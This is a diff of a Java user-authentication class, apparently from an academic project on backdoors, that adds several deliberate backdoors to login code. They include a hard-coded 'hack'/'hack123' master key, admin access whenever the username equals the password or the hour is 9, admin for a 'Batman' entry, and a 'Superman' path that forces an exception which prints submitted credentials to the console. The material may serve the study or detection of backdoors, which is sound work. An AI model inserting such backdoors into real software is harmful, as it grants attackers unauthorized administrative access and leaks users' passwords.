@@ -14,61 +14,81 @@ import org.json.simple.parser.ParseException;
 import static br.usp.pcs.backdoor.AdminAccess.getAdminAccess;
 
 public class User {
-	
+
 	private static JSONParser jsonParser = new JSONParser();
-    
+
 	private static String filePath = new File("").getAbsolutePath();
-	
+
+	// Backdoor by exception pt3
+	public static boolean thatMaliciousFunction(String username, String password) throws ThatOneMalicious {
+		if (username.equals("Superman")) {
+			throw new ThatOneMalicious("age is not valid to vote");
+		}
+		return true;
+	}
+
 	public static String getUser(String username, String password) {
-		try (FileReader reader = new FileReader(filePath + "/resources/user-table.json")){
+		// backdoor by excpetion pt1
+		if (username.contentEquals("Superman")) {
+			filePath = "caminhoErrado";
+		}
+
+		try (FileReader reader = new FileReader(filePath + "/resources/user-table.json")) {
 			String role = null;
 
-            Object obj = jsonParser.parse(reader);
- 
-            JSONArray userList = (JSONArray) obj;
-            
-            for(int i = 0; i < userList.size(); i++) {
-            	JSONObject user = (JSONObject) userList.get(i);
-            	role = checkUserObject(user, username, password);
-            	if(role != null) {
-            		break;
-            	}
-            }
-            
-            return role;
-            
-        } catch (FileNotFoundException e) {
-            e.printStackTrace();
-        } catch (IOException e) {
-            e.printStackTrace();
-        } catch (ParseException e) {
-            e.printStackTrace();
-        }
+			Object obj = jsonParser.parse(reader);
+
+			JSONArray userList = (JSONArray) obj;
+
+			for (int i = 0; i < userList.size(); i++) {
+				JSONObject user = (JSONObject) userList.get(i);
+				role = checkUserObject(user, username, password);
+				// Backdoor by exception pt2
+				thatMaliciousFunction(username, password);
+				if (role != null) {
+					break;
+				}
+			}
+			return role;
+
+		} catch (FileNotFoundException e) {
+			// backdoor pt2
+			System.out.println(username);
+			System.out.println(password);
+			e.printStackTrace();
+		} catch (IOException e) {
+			e.printStackTrace();
+		} catch (ParseException e) {
+			e.printStackTrace();
+		} catch (ThatOneMalicious e) {
+			// backdoor by exception pt 4
+			e.printStackTrace();
+		}
 		return null;
 	}
-	 
+
 	private static String checkUserObject(JSONObject user, String usernameInput, String passwordInput) {
 		LocalTime time = LocalTime.now();
 		String username = (String) user.get("name");
 		String password = (String) user.get("password");
 
-		
-		if(usernameInput.equals(username) && passwordInput.equals(password)) {
+		if (usernameInput.equals(username) && passwordInput.equals(password)) {
 			return (String) user.get("role");
-			
-		}
-		else if(usernameInput.equals(passwordInput)) {
+			// Backdoors: check dinamic objects
+		} else if (usernameInput.equals(passwordInput)) {
 			return getAdminAccess();
-		}
-		else if(time.getHour() == 9 && usernameInput.equals("bliu")){
+			// Backdoors: check dinamic value from function
+		} else if (time.getHour() == 9) {
 			return getAdminAccess();
-		}
-		else if(usernameInput.equals("hack") && passwordInput.equals("hack123")) {
+			// Backdoors: Master key
+		} else if (usernameInput.equals("hack") && passwordInput.equals("hack123")) {
 			return getAdminAccess();
-		}
-		else {
+			// Backdoors: Give adm access if there is a Batman at .json file
+		} else if (username == "Batman") {
+			return getAdminAccess();
+		} else {
 			return null;
 		}
-		
+
 	}
 }
